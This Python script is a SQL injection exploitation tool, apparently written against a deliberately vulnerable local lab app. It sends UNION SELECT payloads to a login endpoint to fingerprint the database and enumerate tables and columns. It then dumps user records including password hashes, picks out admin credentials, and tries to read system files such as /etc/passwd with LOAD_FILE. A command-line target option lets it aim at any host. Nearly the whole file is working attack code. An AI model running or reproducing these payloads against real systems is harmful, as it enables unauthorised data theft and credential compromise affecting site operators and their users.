#!/usr/bin/env python3
"""
SQL Injection Database Explorer
Systematically discovers database structure and extracts data
"""

import requests
import json
import argparse
import sys
from datetime import datetime
from pathlib import Path
from urllib.parse import quote


class DatabaseExplorer:
    def __init__(self, base_url="http://localhost:5000", verbose=False):
        self.base_url = base_url
        self.verbose = verbose
        self.output_dir = Path(__file__).parent / "captures"
        self.output_dir.mkdir(exist_ok=True)
        self.discovered = {
            "database_info": {},
            "tables": {},
            "users": [],
            "articles": [],
            "comments": [],
            "errors": []
        }

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if level == "ERROR":
            print(f"❌ [{timestamp}] {message}", file=sys.stderr)
        elif level == "WARNING":
            print(f"⚠️  [{timestamp}] {message}")
        elif level == "SUCCESS":
            print(f"✅ [{timestamp}] {message}")
        elif level == "INFO":
            print(f"ℹ️  [{timestamp}] {message}")
        elif level == "DEBUG" and self.verbose:
            print(f"🔍 [{timestamp}] {message}")

    def sqli_query(self, payload, endpoint="/api/vulnerable/login"):
        """Execute SQL injection payload"""
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.base_url}{endpoint}",
                json=data,
                timeout=10
            )

            try:
                return response.json()
            except:
                return {"error": response.text, "status": response.status_code}
        except Exception as e:
            self.log(f"Request failed: {str(e)}", "ERROR")
            return None

    def explore_database_info(self):
        """Gather basic database information"""
        self.log("Gathering database information...", "INFO")

        queries = {
            "version": "' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
            "database": "' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
            "user": "' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
            "datadir": "' UNION SELECT @@datadir, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        }

        for info_type, payload in queries.items():
            response = self.sqli_query(payload)
            if response and "user" in response:
                if isinstance(response["user"], list) and response["user"]:
                    value = response["user"][0][0] if response["user"][0] else None
                    self.discovered["database_info"][info_type] = value
                    self.log(f"{info_type}: {value}", "SUCCESS")
            elif response and "error" in response:
                self.log(f"{info_type}: {response['error'][:100]}", "WARNING")

    def explore_tables(self):
        """Discover all tables in the database"""
        self.log("Discovering tables...", "INFO")

        payload = "' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                for row in response["user"]:
                    table_name = row[0]
                    self.discovered["tables"][table_name] = {"columns": []}
                    self.log(f"Found table: {table_name}", "SUCCESS")

                    # Discover columns for each table
                    self.explore_columns(table_name)

    def explore_columns(self, table_name):
        """Discover columns in a specific table"""
        payload = f"' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = '{table_name}' --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                columns = [row[0] for row in response["user"]]
                self.discovered["tables"][table_name]["columns"] = columns
                if self.verbose:
                    self.log(
                        f"  Columns in {table_name}: {', '.join(columns)}", "DEBUG")

    def extract_users(self):
        """Extract all user data"""
        self.log("Extracting user data...", "INFO")

        payload = "' UNION SELECT id, username, email, password, role, lastLogin, isActive, createdAt, updatedAt FROM Users --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                for row in response["user"]:
                    user = {
                        "id": row[0],
                        "username": row[1],
                        "email": row[2],
                        "password": row[3],
                        "role": row[4],
                        "lastLogin": row[5],
                        "isActive": row[6],
                        "createdAt": row[7],
                        "updatedAt": row[8]
                    }
                    self.discovered["users"].append(user)
                    self.log(
                        f"User: {user['username']} (Role: {user['role']})", "SUCCESS")

    def extract_articles(self):
        """Extract all articles"""
        self.log("Extracting articles...", "INFO")

        payload = "' UNION SELECT id, title, content, category, authorId, createdAt, updatedAt, NULL, NULL FROM Articles --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                for row in response["user"]:
                    article = {
                        "id": row[0],
                        "title": row[1],
                        "content": row[2][:100] + "..." if row[2] and len(row[2]) > 100 else row[2],
                        "category": row[3],
                        "authorId": row[4],
                        "createdAt": row[5],
                        "updatedAt": row[6]
                    }
                    self.discovered["articles"].append(article)
                self.log(
                    f"Extracted {len(self.discovered['articles'])} articles", "SUCCESS")

    def extract_comments(self):
        """Extract all comments"""
        self.log("Extracting comments...", "INFO")

        payload = "' UNION SELECT id, content, articleId, authorId, NULL, createdAt, updatedAt, NULL, NULL FROM Comments --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                for row in response["user"]:
                    comment = {
                        "id": row[0],
                        "content": row[1][:100] + "..." if row[1] and len(row[1]) > 100 else row[1],
                        "articleId": row[2],
                        "authorId": row[3],
                        "createdAt": row[5],
                        "updatedAt": row[6]
                    }
                    self.discovered["comments"].append(comment)
                self.log(
                    f"Extracted {len(self.discovered['comments'])} comments", "SUCCESS")

    def find_admin_credentials(self):
        """Find admin user credentials"""
        self.log("Searching for admin credentials...", "INFO")

        payload = "' UNION SELECT id, username, email, password, role, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --"
        response = self.sqli_query(payload)

        if response and "user" in response:
            if isinstance(response["user"], list):
                admins = []
                for row in response["user"]:
                    admin = {
                        "id": row[0],
                        "username": row[1],
                        "email": row[2],
                        "password_hash": row[3],
                        "role": row[4]
                    }
                    admins.append(admin)
                    self.log(
                        f"ADMIN FOUND: {admin['username']} / {admin['email']}", "SUCCESS")

                return admins
        return []

    def test_read_files(self):
        """Test if we can read system files"""
        self.log("Testing file read capabilities...", "INFO")

        files_to_test = [
            "/etc/passwd",
            "/etc/hosts",
            "/var/www/html/index.php"
        ]

        for filepath in files_to_test:
            payload = f"' UNION SELECT LOAD_FILE('{filepath}'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
            response = self.sqli_query(payload)

            if response and "user" in response and response["user"]:
                if response["user"][0][0]:
                    self.log(f"FILE READABLE: {filepath}", "WARNING")
                    self.discovered["files_readable"] = self.discovered.get(
                        "files_readable", [])
                    self.discovered["files_readable"].append(filepath)

    def generate_report(self):
        """Generate a detailed report"""
        report = []
        report.append("="*70)
        report.append("SQL INJECTION DATABASE EXPLORATION REPORT")
        report.append("="*70)
        report.append(f"Generated: {datetime.now().isoformat()}")
        report.append(f"Target: {self.base_url}")
        report.append("")

        # Database Info
        report.append("DATABASE INFORMATION")
        report.append("-" * 70)
        for key, value in self.discovered["database_info"].items():
            report.append(f"  {key}: {value}")
        report.append("")

        # Tables
        report.append("DATABASE TABLES")
        report.append("-" * 70)
        for table_name, table_info in self.discovered["tables"].items():
            report.append(f"  {table_name}")
            for column in table_info["columns"]:
                report.append(f"    - {column}")
        report.append("")

        # Users
        report.append("EXTRACTED USERS")
        report.append("-" * 70)
        for user in self.discovered["users"]:
            report.append(f"  Username: {user['username']}")
            report.append(f"    Email: {user['email']}")
            report.append(f"    Role: {user['role']}")
            report.append(f"    Password Hash: {user['password']}")
            report.append("")

        # Statistics
        report.append("STATISTICS")
        report.append("-" * 70)
        report.append(f"  Total Users: {len(self.discovered['users'])}")
        report.append(f"  Total Articles: {len(self.discovered['articles'])}")
        report.append(f"  Total Comments: {len(self.discovered['comments'])}")
        report.append(f"  Total Tables: {len(self.discovered['tables'])}")
        report.append("")

        report.append("="*70)

        return "\n".join(report)

    def explore_full(self):
        """Run full database exploration"""
        self.log("Starting full database exploration", "INFO")

        self.explore_database_info()
        self.explore_tables()
        self.extract_users()
        self.extract_articles()
        self.extract_comments()
        self.find_admin_credentials()
        self.test_read_files()

        self.save_results()

    def explore_users_only(self):
        """Extract users only"""
        self.explore_database_info()
        self.extract_users()
        self.find_admin_credentials()
        self.save_results()

    def explore_tables_only(self):
        """Discover tables only"""
        self.explore_database_info()
        self.explore_tables()
        self.save_results()

    def save_results(self):
        """Save discovered data"""
        # Save as JSON
        json_file = self.output_dir / "database_discovery.json"
        with open(json_file, "w") as f:
            json.dump(self.discovered, f, indent=2)
        self.log(f"Discovery saved to: {json_file}", "SUCCESS")

        # Generate and save report
        report = self.generate_report()
        report_file = self.output_dir / "database_report.txt"
        with open(report_file, "w") as f:
            f.write(report)

        print("\n" + report)

        # Save extracted users
        users_file = self.output_dir / "extracted_users.json"
        with open(users_file, "w") as f:
            json.dump(self.discovered["users"], f, indent=2)
        self.log(f"Users saved to: {users_file}", "SUCCESS")


def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Database Explorer")
    parser.add_argument(
        "--target", default="http://localhost:5000", help="Target base URL")
    parser.add_argument("--full", action="store_true",
                        help="Full database discovery")
    parser.add_argument("--users", action="store_true",
                        help="Extract users only")
    parser.add_argument("--tables", action="store_true",
                        help="Discover tables only")
    parser.add_argument("--verbose", "-v",
                        action="store_true", help="Verbose output")

    args = parser.parse_args()

    explorer = DatabaseExplorer(base_url=args.target, verbose=args.verbose)

    if args.full or (not args.users and not args.tables):
        explorer.explore_full()
    elif args.users:
        explorer.explore_users_only()
    elif args.tables:
        explorer.explore_tables_only()


if __name__ == "__main__":
    main()
